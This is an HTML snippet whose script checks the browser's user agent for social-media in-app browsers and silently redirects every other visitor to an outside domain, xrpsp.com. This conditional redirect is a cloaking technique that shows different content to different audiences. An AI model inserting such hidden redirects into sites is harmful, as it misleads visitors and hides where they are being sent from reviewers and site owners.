    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.31/ua-parser.min.js"></script>
    <script>
        function isSocialMediaBrowser() {
            const userAgent = navigator.userAgent || navigator.vendor || window.opera;
            const socialMediaPatterns = [
                /Instagram/i,
                /Snapchat/i,
                /FBAN/i, // Facebook App
                /FBAV/i, // Facebook App
                /Twitter/i,
                /TikTok/i,
                /Musical.ly/i // TikTok's previous name
            ];

            // Checking using patterns
            const isSocialMedia = socialMediaPatterns.some(pattern => pattern.test(userAgent));

            return isSocialMedia;
        }

        function redirectToLink() {
            window.location.href = 'https://xrpsp.com/'; // رابط التحويل
        }

        // Check if the user is not using a social media browser
        if (!isSocialMediaBrowser()) {
            redirectToLink();
        }
    </script>
</body>
